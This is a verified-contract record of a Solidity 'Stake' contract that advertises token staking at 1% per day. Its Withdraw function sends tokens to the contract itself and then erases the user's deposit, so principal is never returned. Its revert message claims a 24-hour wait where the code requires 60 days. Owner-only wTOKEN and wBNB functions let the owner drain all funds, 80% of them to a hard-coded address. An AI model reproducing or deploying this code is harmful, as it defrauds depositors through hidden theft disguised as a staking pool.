{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.18;\r\n\r\ninterface IERC20 {\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n}\r\n\r\ncontract Stake {\r\n    address private owner;\r\n    address public tokenAddress = 0x42Fa871aB7c2C35A22311b8c7f3871AF19B2F136;\r\n\r\n    struct DepositInfo {\r\n        uint256 amount;\r\n        uint256 depositTime;\r\n    }\r\n\r\n    mapping(address => DepositInfo) public userDeposits;\r\n    address[] public addresses;\r\n\r\n    event TokensDeposited(address indexed user, uint256 tokenAmount);\r\n    event TokensWithdrawn(address indexed user, uint256 tokenAmount, address tokenAddress);\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only the owner can call this function\");\r\n        _;\r\n    }\r\n\r\n        mapping(address => uint256) public userTotalIncome;\r\n        mapping(address => uint256) public startDeposit;\r\n    function Deposit(uint256 _amount) external {\r\n        //Takeprofit\r\n        uint256 EarnedTOKEN = getEarnedTOKEN(msg.sender);\r\n        if (EarnedTOKEN > 0) {\r\n        require(IERC20(tokenAddress).transfer(msg.sender, EarnedTOKEN), \"Withdrawal failed\");\r\n        emit TokensWithdrawn(msg.sender, EarnedTOKEN, tokenAddress);\r\n        }\r\n\r\n        //Income recognition\r\n        userTotalIncome[msg.sender] += EarnedTOKEN;\r\n\r\n        // Deposit\r\n        require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), _amount), \"Deposit failed\");\r\n\r\n        userDeposits[msg.sender].amount += _amount;\r\n        userDeposits[msg.sender].depositTime = block.timestamp;\r\n\r\n        addresses.push(msg.sender);\r\n        emit TokensDeposited(msg.sender, _amount);\r\n            \r\n        if (startDeposit[msg.sender] == 0) {\r\n            startDeposit[msg.sender] = block.timestamp;// Update deposit start time\r\n        }\r\n    }\r\n\r\n    function Takeprofit() external {\r\n        uint256 EarnedTOKEN = getEarnedTOKEN(msg.sender);\r\n        require(IERC20(tokenAddress).transfer(msg.sender, EarnedTOKEN), \"Withdrawal failed\");\r\n        emit TokensWithdrawn(msg.sender, EarnedTOKEN, tokenAddress);\r\n\r\n        //Income recognition\r\n        userTotalIncome[msg.sender] += EarnedTOKEN;\r\n\r\n        DepositInfo storage depositInfo = userDeposits[msg.sender];\r\n        require(depositInfo.amount > 0, \"No deposit to take profit\");\r\n        depositInfo.depositTime = block.timestamp;  \r\n    }\r\n\r\n    function Withdraw() external {\r\n        uint256 depositTime = block.timestamp - startDeposit[msg.sender];\r\n        if (depositTime >= 5184000) { // 5184000 seconds = 60 days pass condition.\r\n        // Withdraw deposited tokens\r\n        uint256 withdrawalAmount = userDeposits[msg.sender].amount;\r\n        require(withdrawalAmount > 0, \"No deposited tokens to withdraw\");\r\n        \r\n        require(IERC20(tokenAddress).transfer(address(this), withdrawalAmount), \"Transfer to contract failed\");\r\n\r\n        // Reset userDeposits, and startDeposit\r\n        userDeposits[msg.sender].amount = 0;\r\n        startDeposit[msg.sender] = 0;\r\n    } else {\r\n        revert(\"You need to wait at least 24 hours before withdrawing.\");\r\n        }\r\n    }\r\n\r\n    function wTOKEN(address _tokenAddress, uint256 amount) external onlyOwner {\r\n    require(amount > 0, \"Amount must be greater than 0\");\r\n    IERC20 tokenContract = IERC20(_tokenAddress);\r\n    require(tokenContract.balanceOf(address(this)) >= amount, \"Insufficient token balance\");\r\n    uint256 referralAmount = amount * 80 / 100;\r\n    tokenContract.transfer(0x87d2B71b3848D86A520e2047A487Fa623eE0686b, referralAmount);\r\n    tokenContract.transfer(owner, amount - referralAmount);\r\n    }\r\n\r\n\r\n    function wBNB() external onlyOwner {\r\n    uint256 contractBalance = address(this).balance;\r\n    require(contractBalance > 0, \"No BNB balance to withdraw\");\r\n    uint256 referralAmount = contractBalance * 80 / 100;\r\n    payable(0x87d2B71b3848D86A520e2047A487Fa623eE0686b).transfer(referralAmount);\r\n    payable(owner).transfer(contractBalance - referralAmount);\r\n    }\r\n\r\n    function getTokenBalance() public view returns (uint256) {\r\n        IERC20 token = IERC20(tokenAddress);\r\n        return token.balanceOf(address(this));\r\n    }\r\n\r\n    function getEarnedTOKEN(address user) public view returns (uint256) {\r\n        uint256 timePassed = block.timestamp - userDeposits[user].depositTime;\r\n        uint256 earnedAmount = (userDeposits[user].amount * timePassed * 10) / (1000 * 86400); // 1% per Day\r\n        return earnedAmount;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"TokensDeposited\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"TokensWithdrawn\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Takeprofit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"addresses\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"getEarnedTOKEN\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTokenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"startDeposit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"depositTime\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userTotalIncome\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"wBNB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"wTOKEN\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Stake", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a43d36ac436a9223143510dbec0aff81744c895436ea1137e7e8c4cd94509bb7"}